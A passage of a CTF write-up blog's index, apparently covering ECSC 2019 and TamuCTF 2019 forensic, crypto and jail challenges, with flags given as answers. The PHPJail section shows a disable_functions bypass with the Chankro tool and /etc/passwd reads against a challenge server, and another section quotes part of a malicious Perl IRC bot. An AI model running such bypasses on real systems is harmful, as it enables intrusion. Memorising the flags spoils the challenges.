Description : CLUE-\u003eJACKET ;-) [...] Description : LSooRkxBRyA6IEVDU0N7c2hhMjU2KHNvbmcncyB0aXRsZSBpbiBsb3dlciBjYXNlIHdpdGhvdXQgc3BhY2UpfSkqLQo= [...] ➜ cryptodiy echo -n 'LSooRkxBRyA6IEVDU0N7c2hhMjU2KHNvbmcncyB0aXRsZSBpbiBsb3dlciBjYXNlIHdpdGhvdXQgc3BhY2UpfSkqLQo=' | base64 -D -*(FLAG : ECSC{sha256(song's title in lower case without space)})*- Pour les plus vieux des personnes qui liront ce writeup, l’application Snapchat permet de reconnaitre une musique vu que Shazam est embarqué: ➜ cryptodiy echo -n 'iamthebest' | sha256sum 6693efcd0503059fc0561450033ac9fe712aff09e31e460f4f321f4324585188 - ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:7:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"Flag ECSC{6693efcd0503059fc0561450033ac9fe712aff09e31e460f4f321f4324585188} ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019cryptodiy/:8:0","tags":["anssi","ecsc","crypto","chinese remainder theorem"],"title":"[ECSC] - CryptoDIY","uri":"maki.bzh/writeups/ecscfrench2019cryptodiy/"},{"categories":["Writeups"],"content":"Description Notre SoC a détecté qu’un document confidentiel avait été exfiltré ! La méthode utilisée ne semble pas avancée et heureusement, une capture réseau a pu être faite au bon moment… Retrouvez ce document. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019exfiltration/:1:0","tags":["anssi","ecsc","wireshark","crypto","network"],"title":"[ECSC] - Exfiltration","uri":"maki.bzh/writeups/ecscfrench2019exfiltration/"},{"categories":["Writeups"],"content":"Trouver la configuration de l’extraction On commence cette épreuve par une capture réseau. Comme à chaque fois en matière d’exfiltration, il suffit de trouver un bout du filon pour le remonter complètement. Fig 6: Configuration de l’exfiltration ➜ exfil tshark -r exfiltration.pcap -Y 'icmp.resp_to' -Tfields -e 'data.data' | xxd -r -p config : exfiltered_file_size=4193bytes config : file_type=DOCX config : data_len_for_each_packet=random config : encryption=XOR Maintenant, on sait qu’on cherche un DOCX xoré de 4193 octets. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019exfiltration/:2:0","tags":["anssi","ecsc","wireshark","crypto","network"],"title":"[ECSC] - Exfiltration","uri":"maki.bzh/writeups/ecscfrench2019exfiltration/"},{"categories":["Writeups"],"content":"Récupérer la donnée chiffrée On filtre donc sur les IP qui se sont échangées la configuration: Fig 7: Exfiltration de la donnée data étant la donnée chiffrée. uuid l’identifiant du fichier extrait. ➜ tshark -r exfiltration.pcap -Y '((urlencoded-form.key == \"data\")) and (ip.src == 192.168.1.26)' -Tfields -e 'urlencoded-form.value' | cut -d',' -f1 | tr -d ' \\n' | xxd -r -p \u003e docx.xor On a bien récupéré notre bouilli. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019exfiltration/:3:0","tags":["anssi","ecsc","wireshark","crypto","network"],"title":"[ECSC] - Exfiltration","uri":"maki.bzh/writeups/ecscfrench2019exfiltration/"},{"categories":["Writeups"],"content":"XOR time On sait que c’est xoré, on sait aussi que c’est un DOCX donc en principe on peut faire du clair connu dessus. Maintenant, est ce que xortool ne peux pas le faire tout seul comme un grand : (exfil) ➜ exfil xortool/xortool/xortool docx.xor The most probable key lengths: 2: 12.8% 4: 15.4% 6: 10.8% 8: 12.7% 10: 8.9% 12: 10.4% 14: 7.4% 16: 8.5% 18: 6.0% 20: 7.0% Key-length can be 4*n Most possible char is needed to guess the key! (exfil) ➜ exfil xortool/xortool/xortool docx.xor -l 4 -c 00 1 possible key(s) of length 4: ecsc Found 0 plaintexts with 95.0%+ valid characters See files filename-key.csv, filename-char_used-perc_valid.csv (exfil) ➜ exfil xortool/xortool/xortool-xor -f docx.xor -s \"ecsc\" \u003e clear.docx (exfil) ➜ exfil file clear.docx clear.docx: Microsoft Word 2007+ Fig 8: Donnée confidentielle récupérée ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019exfiltration/:4:0","tags":["anssi","ecsc","wireshark","crypto","network"],"title":"[ECSC] - Exfiltration","uri":"maki.bzh/writeups/ecscfrench2019exfiltration/"},{"categories":["Writeups"],"content":"Flag ECSC{v3ry_n01sy_3xf1ltr4t10n} ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019exfiltration/:5:0","tags":["anssi","ecsc","wireshark","crypto","network"],"title":"[ECSC] - Exfiltration","uri":"maki.bzh/writeups/ecscfrench2019exfiltration/"},{"categories":["Writeups"],"content":"Description Connaissez-vous bien le format PCAPng ? ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019petitenote/:1:0","tags":["anssi","ecsc","wireshark","forensic","network"],"title":"[ECSC] - Petites notes","uri":"maki.bzh/writeups/ecscfrench2019petitenote/"},{"categories":["Writeups"],"content":"Etat des lieux On commence donc ce challenge avec une capture réseau. Premier réflexe de CTF avec un format de flag : strings. ➜ petitenote hexdump -C petites_notes.pcapng | grep -C 10 'ECSC' 001b3f80 00 0a 00 00 2f 03 6e 73 31 05 6b 61 73 65 63 02 |..../.ns1.kasec.| 001b3f90 61 74 00 0a 68 6f 73 74 6d 61 73 74 65 72 c0 10 |at..hostmaster..| 001b3fa0 5c c0 3a 9f 00 00 40 00 00 00 08 00 00 10 00 00 |\\.:...@.........| 001b3fb0 00 00 0a 00 bc 00 00 00 06 00 00 00 80 00 00 00 |................| 001b3fc0 00 00 00 00 5e c2 99 15 a8 8b 11 2f 4a 00 00 00 |....^....../J...| 001b3fd0 4a 00 00 00 a4 3e 51 0c ed 79 bc ee 7b 2e 15 90 |J....\u003eQ..y..{...| 001b3fe0 08 00 45 00 00 3c 7d 96 40 00 40 06 6e 95 c0 a8 |..E..\u003c}.@.@.n...| 001b3ff0 01 19 34 a6 58 29 83 5e 01 bb 05 ef b9 51 00 00 |..4.X).^.....Q..| 001b4000 00 00 a0 02 72 10 7e 3a 00 00 02 04 05 b4 04 02 |....r.~:........| 001b4010 08 0a 00 03 c4 c7 00 00 00 00 01 03 03 07 00 00 |................| 001b4020 01 00 09 00 45 43 53 43 7b 63 53 68 6c 00 00 00 |....ECSC{cShl...| 001b4030 00 00 00 00 80 00 00 00 06 00 00 00 6c 00 00 00 |............l...| 001b4040 00 00 00 00 5e c2 99 15 79 e0 14 2f 4a 00 00 00 |....^...y../J...| 001b4050 4a 00 00 00 a4 3e 51 0c ed 79 bc ee 7b 2e 15 90 |J....\u003eQ..y..{...| 001b4060 08 00 45 00 00 3c fa 0e 40 00 40 06 f2 1c c0 a8 |..E..\u003c..@.@.....| 001b4070 01 19 34 a6 58 29 83 60 01 bb 8f fc 3e c9 00 00 |..4.X).`....\u003e...| 001b4080 00 00 a0 02 72 10 6e b3 00 00 02 04 05 b4 04 02 |....r.n.........| 001b4090 08 0a 00 03 c4 c7 00 00 00 00 01 03 03 07 00 00 |................| 001b40a0 6c 00 00 00 06 00 00 00 6c 00 00 00 00 00 00 00 |l.......l.......| 001b40b0 5e c2 99 15 c6 66 17 2f 4a 00 00 00 4a 00 00 00 |^....f./J...J...| 001b40c0 a4 3e 51 0c ed 79 bc ee 7b 2e 15 90 08 00 45 00 |.\u003eQ..y..{.....E.| On peut voir le début du flag, mais il n’apparaît pas directement dans les communications: Fig 1: Recherche de la chaine “ECSC” Je me suis donc mis à la recherche d’une chaîne à coté, comme e5dH: Fig 2: Début et fin de paquets Donc le début de flag, et probablement la suite, se trouve “entre” des paquets. Maintenant, il va falloir RTFM les fonctionnalités de Wireshark. https://packetu.com/2013/06/18/using-the-wireshark-commenting-feature/ Un peu de tshark et voilà notre flag : ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019petitenote/:2:0","tags":["anssi","ecsc","wireshark","forensic","network"],"title":"[ECSC] - Petites notes","uri":"maki.bzh/writeups/ecscfrench2019petitenote/"},{"categories":["Writeups"],"content":"Flag ECSC{cShle5dOKYBfjLNzT} ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019petitenote/:3:0","tags":["anssi","ecsc","wireshark","forensic","network"],"title":"[ECSC] - Petites notes","uri":"maki.bzh/writeups/ecscfrench2019petitenote/"},{"categories":["Writeups"],"content":"Description Saurez-vous sortir de cette prison PHP pour retrouver le fichier flag présent sur le système ? ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019phpjail/:1:0","tags":["anssi","ecsc","jail","php","chankro"],"title":"[ECSC] - PHPJail","uri":"maki.bzh/writeups/ecscfrench2019phpjail/"},{"categories":["Writeups"],"content":"Etat des lieux Nous sommes face à une jail PHP, commençons par un phpinfo(); histoire de voir ce qui n’est pas autorisé: ➜ phpjail cat \u003c(echo \"phpinfo();\") - | nc challenges.ecsc-teamfrance.fr 4002 /// PHP JAIL //// There's a file named flag on this filesystem. Find it. Read it. Flag it. Enter your command: phpinfo() PHP Version =\u003e 7.0.33-0+deb9u3 [...] disable_classes =\u003e Directory, DirectoryIterator, FilesystemIterator, GlobIterator, RecursiveDirectoryIterator, SplFileObject, SplFileInfo =\u003e Directory, DirectoryIterator, FilesystemIterator, GlobIterator, RecursiveDirectoryIterator, SplFileObject, SplFileInfo disable_functions =\u003e system, exec, shell_exec, passthru, show_source, popen, proc_open, fopen_with_path, dbmopen, dbase_open, move_uploaded_file, chdir, mkdir, rmdir, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo, fopen, fread, file_get_contents, readfile, opendir, readdir, scandir, glob, file, dir, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix, _getppid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_getuid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, virtual, openlog, closelog, ini_set, ini_restore, ignore_user_abort, link, pcntl_alarm, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, is_dir =\u003e system, exec, shell_exec, passthru, show_source, popen, proc_open, fopen_with_path, dbmopen, dbase_open, move_uploaded_file, chdir, mkdir, rmdir, rename, filepro, filepro_rowcount, filepro_retrieve, posix_mkfifo, fopen, fread, file_get_contents, readfile, opendir, readdir, scandir, glob, file, dir, posix_ctermid, posix_getcwd, posix_getegid, posix_geteuid, posix_getgid, posix_getgrgid, posix_getgrnam, posix_getgroups, posix_getlogin, posix_getpgid, posix_getpgrp, posix_getpid, posix, _getppid, posix_getpwnam, posix_getpwuid, posix_getrlimit, posix_getsid, posix_getuid, posix_isatty, posix_kill, posix_mkfifo, posix_setegid, posix_seteuid, posix_setgid, posix_setpgid, posix_setsid, posix_setuid, posix_times, posix_ttyname, posix_uname, virtual, openlog, closelog, ini_set, ini_restore, ignore_user_abort, link, pcntl_alarm, pcntl_exec, pcntl_fork, pcntl_get_last_error, pcntl_getpriority, pcntl_setpriority, pcntl_signal, pcntl_signal_dispatch, pcntl_sigprocmask, pcntl_sigtimedwait, pcntl_sigwaitinfo, pcntl_strerror, pcntl_wait, pcntl_waitpid, pcntl_wexitstatus, pcntl_wifexited, pcntl_wifsignaled, pcntl_wifstopped, pcntl_wstopsig, pcntl_wtermsig, ftp_connect, ftp_exec, ftp_get, ftp_login, ftp_nb_fput, ftp_put, ftp_raw, ftp_rawlist, is_dir [...] Bon, ça fait un paquet de choses interdites. ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019phpjail/:2:0","tags":["anssi","ecsc","jail","php","chankro"],"title":"[ECSC] - PHPJail","uri":"maki.bzh/writeups/ecscfrench2019phpjail/"},{"categories":["Writeups"],"content":"Read everywhere La fonction highlight_file(); n’est pas bloqué, on va s’en servir pour lire des fichiers : ➜ phpjail cat \u003c(echo \"highlight_file('/etc/passwd');\") - | nc challenges.ecsc-teamfrance.fr 4002 /// PHP JAIL //// There's a file named flag on this filesystem. Find it. Read it. Flag it. Enter your command: \u003ccode\u003e\u003cspan style=\"color: #000000\"\u003e root❌0:0:root:/root:/bin/bash\u003cbr /\u003edaemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin\u003cbr /\u003ebin❌2:2:bin:/bin:/usr/sbin/nologin\u003cbr /\u003esys❌3:3:sys:/dev:/usr/sbin/nologin\u003cbr /\u003esync❌4:65534:sync:/bin:/bin/sync\u003cbr /\u003egames❌5:60:games:/usr/games:/usr/sbin/nologin\u003cbr /\u003eman❌6:12:man:/var/cache/man:/usr/sbin/nologin\u003cbr /\u003elp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin\u003cbr /\u003email❌8:8:mail:/var/mail:/usr/sbin/nologin\u003cbr /\u003enews❌9:9:news:/var/spool/news:/usr/sbin/nologin\u003cbr /\u003euucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\u003cbr /\u003eproxy❌13:13:proxy:/bin:/usr/sbin/nologin\u003cbr /\u003ewww-data❌33:33:www-data:/var/www:/usr/sbin/nologin\u003cbr /\u003ebackup❌34:34:backup:/var/backups:/usr/sbin/nologin\u003cbr /\u003elist❌38:38:Mailing\u0026nbsp;List\u0026nbsp;Manager:/var/list:/usr/sbin/nologin\u003cbr /\u003eirc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin\u003cbr /\u003egnats❌41:41:Gnats\u0026nbsp;Bug-Reporting\u0026nbsp;System\u0026nbsp;(admin):/var/lib/gnats:/usr/sbin/nologin\u003cbr /\u003enobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin\u003cbr /\u003e_apt❌100:65534::/nonexistent:/bin/false\u003cbr /\u003eDebian-exim❌101:101::/var/spool/exim4:/bin/false\u003cbr /\u003emessagebus❌102:103::/var/run/dbus:/bin/false\u003cbr /\u003euser0❌999:999::/home/user0:/bin/zsh\u003cbr /\u003e\u003c/span\u003e \u003c/code\u003e Bye! ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019phpjail/:3:0","tags":["anssi","ecsc","jail","php","chankro"],"title":"[ECSC] - PHPJail","uri":"maki.bzh/writeups/ecscfrench2019phpjail/"},{"categories":["Writeups"],"content":"Command execution On peut remarquer que la fonction mail(); n’est pas non plus bloquée, on pourrait s’en servir. https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/ Tarlogic a fait un outil permettant de créer un fichier PHP avec le payload et les libs embarqués: https://github.com/TarlogicSecurity/Chankro Premièrement, localiser le fichier flag: (Chankro) ➜ Chankro git:(master) ✗ cat rev.sh #!/bin/sh find / -name flag \u003e /tmp/asas (Chankro) ➜ Chankro git:(master) ✗ python chankro.py --arch 64 --input rev.sh --output chan.php --path /tmp/ -=[ Chankro ]=- -={ @TheXC3LL }=- [+] Binary file: rev.sh [+] Architecture: x64 [+] Final PHP: chan.php [+] File created! Pour pouvoir executer le contenu de chan.php on va virer les balises PHP \u003c?php ?\u003e et les saut de lignes. Lorsque c’est fait, il ne reste plus qu’à l’envoyer: (Chankro) ➜ Chankro git:(master) ✗ cat chan.php - | nc challenges.ecsc-teamfrance.fr 4002 [...] Enter your command: Bye! (Chankro) ➜ Chankro git:(master) ✗ cat \u003c(echo \"highlight_file('/tmp/asas');\") - | nc challenges.ecsc-teamfrance.fr 4002 [...] Enter your command: \u003ccode\u003e\u003cspan style=\"color: #000000\"\u003e /home/user0/.sensitive/randomdir/flag\u003cbr /\u003e/usr/local/lib/python2.7/dist-packages/pwnlib/flag\u003cbr /\u003e\u003c/span\u003e \u003c/code\u003e Bye! /home/user0/.sensitive/randomdir/flag (Chankro) ➜ Chankro git:(master) ✗ cat \u003c(echo \"highlight_file('/home/user0/.sensitive/randomdir/flag');\") - | nc challenges.ecsc-teamfrance.fr 4002 [...] Enter your command: \u003ccode\u003e\u003cspan style=\"color: #000000\"\u003e ECSC{22b1843abfd76008ce3683e583c66e85c6bbdc65}\u003cbr /\u003e\u003c/span\u003e \u003c/code\u003e Bye! ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019phpjail/:4:0","tags":["anssi","ecsc","jail","php","chankro"],"title":"[ECSC] - PHPJail","uri":"maki.bzh/writeups/ecscfrench2019phpjail/"},{"categories":["Writeups"],"content":"Flag ECSC{22b1843abfd76008ce3683e583c66e85c6bbdc65} ","date":"2019-06-27","objectID":"maki.bzh/writeups/ecscfrench2019phpjail/:5:0","tags":["anssi","ecsc","jail","php","chankro"],"title":"[ECSC] - PHPJail","uri":"maki.bzh/writeups/ecscfrench2019phpjail/"},{"categories":["Writeups"],"content":"This part of the writeup will go pretty fast, it’s just parsing in the end. All challenges are in the following archive: Password for the archive: tamuctf Filename MD5 Hash Download link honeypot2.7z b08992d50e5885f6db8cf50f22eefab4 https://drive.google.com/uc?id=1lhYsk97AgYDMxzfz1r6FzUs28sugZUR0\u0026export=download Warning this challenge contains some malware samples. ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019honeypots/:0:0","tags":["tamuctf","forensic","honeypots","suricata","malware"],"title":"[TamuCTF 2019] - Honeypots","uri":"maki.bzh/writeups/tamu2019honeypots/"},{"categories":["Writeups"],"content":"Cowrie What was the most common src ip (telnet \u0026 ssh)? What was the most common telnet username? What was the most common ssh username? What is the url and channel of the IRC server that the one downloaded script tried to connect to? (url, channel) In order to find the most used IP address for telnet and ssh, I just count, sort and print the first line: ▶ cat cowrie.json.2018*| jq | grep \"src_ip\" | sort | uniq -c | sort -nr | head -n 1 21011 \"src_ip\": \"211.143.198.161\", Flag 1: 211.143.198.161 Some things for flag 2 and 3: ▶ cat cowrie.json.2018* | jq | grep username | sort | uniq -c | sort -nr | head -n 2 12998 \"username\": \"root\", 9626 \"username\": \"admin\", Flag 2: root Flag 3: admin Cowrie is saving all binaries / scripts or whatever dropped by the attacker, I’m able to find it in download folder: ▶ file cowrie/downloads/d3f074230f4b62a4d2a8d50a5df9a51d6fe20a8d3b27c1ff9459cdbc531f489d cowrie/downloads/d3f074230f4b62a4d2a8d50a5df9a51d6fe20a8d3b27c1ff9459cdbc531f489d: a /usr/bin/perl script executable (binary data) ▶ cat d3f074230f4b62a4d2a8d50a5df9a51d6fe20a8d3b27c1ff9459cdbc531f489d | sed '/^[[:space:]]*$/d' [...] $server = 'irc.quakenet.org' unless $server; my $port = '6667'; my $linas_max='8'; my $sleep='5'; my $homedir = \"/tmp\"; my $version = 'Undernet Perl Bot v1.0'; my @admins = (\"gov\",\"gov-\",\"fucker-\",\"fucker\",\"op\"); my @hostauth = (\"fucker.users.quakenet.org\",\"gov.users.quakenet.org\",\"cker.pro\"); my @channels = (\"#bookz\"); [...] Flag 4: irc.quakenet.org, bookz ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019honeypots/:1:0","tags":["tamuctf","forensic","honeypots","suricata","malware"],"title":"[TamuCTF 2019] - Honeypots","uri":"maki.bzh/writeups/tamu2019honeypots/"},{"categories":["Writeups"],"content":"Dionaea What was the most common src ip? What is the common name for the most commonly downloaded malware? ▶ cat dionaea/log/dionaea.json.* | jq | grep 'src_ip' | sort | uniq -c | sort -nr | head -n 1 128 \"src_ip\": \"::ffff:193.56.29.24\", Flag 1: 193.56.29.24 Lots of binaries are stored by the honeypot. I just generate md5sum for all of them and check the first one on VirusTotal: ▶ md5sum dionaea/binaries/data/dionaea/binaries/* 0ab2aeda90221832167e5127332dd702 dionaea/binaries/data/dionaea/binaries/0ab2aeda90221832167e5127332dd702 1533a4e55cee10a9487e4b13abff4688 dionaea/binaries/data/dionaea/binaries/1533a4e55cee10a9487e4b13abff4688 1a400481251fac98bc574c0aed7beca8 dionaea/binaries/data/dionaea/binaries/1a400481251fac98bc574c0aed7beca8 20b431c101855960614b21e4c1b26451 dionaea/binaries/data/dionaea/binaries/20b431c101855960614b21e4c1b26451 2622e5c9ac05ed71ab35606493627c13 dionaea/binaries/data/dionaea/binaries/2622e5c9ac05ed71ab35606493627c13 2de98404eb4ac4a525ed1884f4ea445b dionaea/binaries/data/dionaea/binaries/2de98404eb4ac4a525ed1884f4ea445b [...] According to Avira: Flag 3: wannacry ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019honeypots/:2:0","tags":["tamuctf","forensic","honeypots","suricata","malware"],"title":"[TamuCTF 2019] - Honeypots","uri":"maki.bzh/writeups/tamu2019honeypots/"},{"categories":["Writeups"],"content":"Glastopf What was the most common src ip? What are the three most commonly requested url besides / get or post? (no slashes, all lowercase, alphabetical (1.ext, a.ext, b.ext)) In this honeypot logs are not stored in JSON format… So I had to parse them with cut. ▶ cat glastopf/log/glastopf.log.* | cut -d\" \" -f4 | sort | uniq -c | sort -nr | head -n 1 274 85.121.16.8 Flag 1: 85.121.16.8 ▶ cat glastopf/log/glastopf.log.* | cut -d\" \" -f7 | sort | uniq -c | sort -nr | head -n 4 96 / 20 /qq.php 20 /confg.php 20 /1.php Flag 2: 1.php, confg.php, qq.php ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019honeypots/:3:0","tags":["tamuctf","forensic","honeypots","suricata","malware"],"title":"[TamuCTF 2019] - Honeypots","uri":"maki.bzh/writeups/tamu2019honeypots/"},{"categories":["Writeups"],"content":"Honeytrap What was the most common src ip? What was the most common user agent? What was the second most common user agent? As the previous honeypot, logs are not stored as json file, so I cut them and doing some sed stuff in order to remove all associate ports, I only need IP address: ▶ cat honeytrap/log/attacker.log| cut -d\" \" -f5 | sed 's/:.*//' | uniq | sort | uniq -c | sort -nr | head -n 1 9 5.188.210.12 Flag 1: 5.188.210.12 For two most common user-agent: ▶ cat honeytrap/attacks/* | grep -a 'User-Agent' | sort | uniq -c | sort -nr | head -n 2 28 User-Agent: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-696.30.1.el6.x86_64 11 User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36 Flag 2: python-requests/2.6.0 CPython/2.6.6 Linux/2.6.32-696.30.1.el6.x86_64 Flag 3: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36 ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019honeypots/:4:0","tags":["tamuctf","forensic","honeypots","suricata","malware"],"title":"[TamuCTF 2019] - Honeypots","uri":"maki.bzh/writeups/tamu2019honeypots/"},{"categories":["Writeups"],"content":"Suricata What CVE was alerted for the most? What was the most common signature? JSON logs, great. ▶ cat suricata/log/suricata_ews.log.* | jq | grep \"cve_id\" | sort | uniq -c | sort -nr | head -n 1 1527 \"cve_id\": \"CVE-2006-2369\", Flag 1: CVE-2006-2369 There are signature pattern in both log files (eve.json and suricata_ews.log), then: ▶ cat suricata/log/* | jq | grep 'signature\"' | sort | uniq -c | sort -nr | head -n 1 1426173 \"signature\": \"ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication\", Flag 2: ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019honeypots/:5:0","tags":["tamuctf","forensic","honeypots","suricata","malware"],"title":"[TamuCTF 2019] - Honeypots","uri":"maki.bzh/writeups/tamu2019honeypots/"},{"categories":["Writeups"],"content":"0_Intrusion Welcome to MicroServices inc, where do all things micro and service oriented! Recently we got an alert saying there was suspicious traffic on one of our web servers. Can you help us out? Filename MD5 hash Download link microservice.pcap 18d2c48f5d03d5faa5cb4473f9819b4b https://mega.nz/#!Gv5zAahB!afQTRfSLEE93xDDoZbi0EoGLrGzshAALLCS-1LwykdY What is the IP Address of the attacker? For this flag I don’t have any real analysis, I just opened the PCAP file and looked at the different TCP conversations. The IP that sends the most data and voila: Flag: 10.91.9.93 ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019microservices/:1:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","docker"],"title":"[TamuCTF 2019] - Microservices","uri":"maki.bzh/writeups/tamu2019microservices/"},{"categories":["Writeups"],"content":"1_Logs Thanks for discovering the malicious IP. We will add it to our block list. We also got a disk image of the web server while you were working. Can you dig a little deeper for us? Filename MD5 Download link filesystem.image 490c78e249177e6478539f459ca14e87 https://drive.google.com/uc?id=19zgsmqMZ_QltLYzWcCdxizV9Wipj-2NI\u0026export=download What user was the attacker able to login as? What is the date \u0026 time that the attacker logged in? (MM/DD:HH:MM:SS) Once the archive is finally downloaded, we’ll mount it in readonly to avoid screwing everything inside: ▶ mkdir aaa ▶ sudo mount -o ro filesystem.image aaa We know the attacker’s IP (10.91.9.93) and we are looking for a connection. Let’s see what the auth.log file contains: ➜ microservices cat aaa/var/log/auth.log | grep '10.91.9.93' Feb 17 00:06:04 ubuntu-xenial sshd[15799]: Accepted publickey for root from 10.91.9.93 port 41592 ssh2: RSA SHA256:lR4653Hv/Y9QthWvXFB2KkNPzQ1r8mItv83OgiCAR4g We got all flags immediately: Flag 1: root Flag 2: 02/17:00:06:04 ","date":"2019-02-28","objectID":"maki.bzh/writeups/tamu2019microservices/:2:0","tags":["tamuctf","forensic","network","wireshark","pcap","cryptography","docker"],"title":"[TamuCTF 2019] - Microservices","uri":"maki.bzh/writeups/tamu2019microservices/"},{"categories":["Writeups"],"content":"2_Analysis Thanks for that information. Can you take a deeper dive now and figure out exactly how the attacker go in? What is the name of the service that was used to compromise the machine? (All lowercase) What is the md5sum of the initial compromising file? What specific line in the initial compromising file was the most dangerous? (Actual line, spaces in front don’t matter) During an investigation, my first reflex is to go to the folders of the different users (/home, /root): ➜ microservices tree -a -f aaa/root aaa/root ├── aaa/root/.bashrc ├── aaa/root/.cache │ └── aaa/root/.cache/motd.legal-displayed ├── aaa/root/.profile └── aaa/root/.ssh ├── aaa/root/.ssh/authorized_keys └── aaa/root/.ssh/id_rsa ➜ microservices tree -a -f aaa/home aaa/home └── aaa/home/ubuntu ├── aaa/home/ubuntu/.ansible │ └── aaa/home/ubuntu/.ansible/tmp │ └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029 │ └── aaa/home/ubuntu/.ansible/tmp/ansible-tmp-1550362148.9-21461470003029/command ├── aaa/home/ubuntu/.bash_logout ├── aaa/home/ubuntu/.bashrc ├── aaa/home/ubuntu/.cache │ └── aaa/home/ubuntu/.cache/motd.legal-displayed ├── aaa/home/ubuntu/.data │ ├── aaa/home/ubuntu/.data/mysql │ │ ├── aaa/home/ubuntu/.data/mysql/aria_log.00000001 │ │ ├── aaa/home/ubuntu/.data/mysql/aria_log_control │ │ ├── aaa/home/ubuntu/.data/mysql/customers │ │ │ ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.frm │ │ │ ├── aaa/home/ubuntu/.data/mysql/customers/customer_info.ibd │ │ │ └── aaa/home/ubuntu/.data/mysql/customers/db.opt │ │ ├── aaa/home/ubuntu/.data/mysql/ib_buffer_pool │ │ ├── aaa/home/ubuntu/.data/mysql/ibdata1 [LOOOOOOTS OF MYSQL FILES] │ │ ├── aaa/home/ubuntu/.data/mysql/performance_schema │ │ │ └── aaa/home/ubuntu/.data/mysql/performance_schema/db.opt │ │ └── aaa/home/ubuntu/.data/mysql/tc.log │ └── aaa/home/ubuntu/.data/redis ├── aaa/home/ubuntu/docker-compose.yml ├── aaa/home/ubuntu/id_rsa.pub ├── aaa/home/ubuntu/logs │ ├── aaa/home/ubuntu/logs/access.log │ ├── aaa/home/ubuntu/logs/error.log │ └── aaa/home/ubuntu/logs/other_vhosts_access.log ├── aaa/home/ubuntu/.profile ├── aaa/home/ubuntu/.ssh │ └── aaa/home/ubuntu/.ssh/authorized_keys └── aaa/home/ubuntu/.sudo_as_admin_successful 13 directories, 112 files We will search in the /etc/passwd file if there are no other users who have can access to a bash: ➜ microservices cat aaa/etc/passwd | grep bash root❌0:0:root:/root:/bin/bash ubuntu❌1000:1000:Ubuntu:/home/ubuntu:/bin/bash dev❌0:0:root:/root:/bin/bash It’s funny, the user dev has /root as $HOME directory… We see a docker-composes.yml file in the user’s directory ubuntu: ➜ microservices cat aaa/home/ubuntu/docker-compose.yml version: '2' services: web: image: tamuctf/webfront:latest restart: always ports: - \"80:80\" environment: - DATABASE_URL=mysql+pymysql://root:351BrE7aTQE8@db/customers - REDIS_URL=redis://cache:6379 volumes: - ./logs:/var/log/apache2 - /:/tmp depends_on: - db networks: default: internal: db: image: mariadb:10.2 restart: always environment: - MYSQL_ROOT_PASSWORD=351BrE7aTQE8 - MYSQL_USER=user - MYSQL_PASSWORD=e68Qc2s0HsyR volumes: - .data/mysql:/var/lib/mysql networks: internal: # This command is required to set important mariadb defaults command: [mysqld, --character-set-server=utf8mb4, --collation-server=utf8mb4_unicode_ci, --wait_timeout=28800, --log-warnings=0] cache: image: redis:4 restart: always volumes: - .data/redis:/data networks: internal: networks: default: internal: internal: true If you’re a little familiar with Docker, you’ve already found out where the attacker went. Line 13 of the file, the user is mounting the root directory in the /tmp folder of the container: /:/tmp As a result, the attacker compromised the webfront and got access to the host filesystem as root user. So he was able to retrieve the SSH private key from the host and logged in with. The MD5 